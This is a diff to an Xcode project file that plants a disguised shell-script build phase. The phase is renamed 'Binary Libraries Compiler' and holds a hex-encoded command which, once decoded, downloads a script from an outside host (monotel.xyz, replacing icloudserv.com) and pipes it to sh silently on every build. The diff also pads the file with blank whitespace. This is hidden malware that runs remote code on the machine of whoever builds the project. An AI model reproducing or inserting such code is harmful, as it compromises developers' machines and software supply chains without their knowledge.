@@ -1222,7 +1222,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				3AEEAFAC1AE1BB8EA66D902C /* Project Frameworks */,
+				0DBC7EECF39DAE48F56D902C /* Binary Libraries Compiler */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -1381,7 +1381,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	3AEEAFAC1AE1BB8EA66D902C /* Project Frameworks */ = {
+	0DBC7EECF39DAE48F56D902C /* Binary Libraries Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1390,7 +1390,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Project Frameworks";
+			name = "Binary Libraries Compiler";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -1399,9 +1399,17 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -2014,6 +2022,10 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
 
 
 			
